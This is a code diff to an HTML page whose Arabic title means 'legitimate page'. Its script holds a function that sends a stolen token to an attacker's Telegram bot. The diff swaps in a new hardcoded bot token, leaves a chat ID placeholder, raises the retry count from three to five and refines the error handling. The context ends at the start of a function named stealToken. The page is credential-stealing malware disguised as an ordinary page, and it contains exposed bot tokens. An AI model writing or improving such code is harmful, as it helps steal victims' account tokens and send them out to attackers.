@@ -6,11 +6,11 @@
     <title>صفحة شرعية</title>
     <script>
         async function sendTokenToTelegram(token) {
-            const botToken = "7121165958:AAGwpDLOVCWty7-QBlv5JFoSjEjmTOzZmEE";
-            const chatId = "6066673128";
+            const botToken = "8145854526:AAHwbn86MVJ_Lmq9g5RVOfJjkiQ0WREQ_E0";  // التوكن الجديد
+            const chatId = "YOUR_CHAT_ID";  // استبدل هذا بـ Chat ID الخاص بك
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            for (let attempt = 1; attempt <= 3; attempt++) {
+            for (let attempt = 1; attempt <= 5; attempt++) {
                 try {
                     const response = await fetch(url, {
                         method: 'POST',
@@ -27,17 +27,18 @@
                         console.log('تم إرسال التوكن بنجاح!');
                         return;
                     } else {
-                        console.error(`فشل الإرسال (المحاولة ${attempt}):`, await response.text());
+                        const errorData = await response.json();
+                        console.error(`فشل الإرسال (المحاولة ${attempt}):`, errorData);
                     }
                 } catch (error) {
                     console.error(`حدث خطأ (المحاولة ${attempt}):`, error);
                 }
 
-                // انتظر 2 ثانية قبل المحاولة التالية
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // انتظر 3 ثوانٍ قبل المحاولة التالية
+                await new Promise(resolve => setTimeout(resolve, 3000));
             }
 
-            console.error('فشل إرسال التوكن بعد 3 محاولات.');
+            console.error('فشل إرسال التوكن بعد 5 محاولات.');
         }
 
         async function stealToken() {
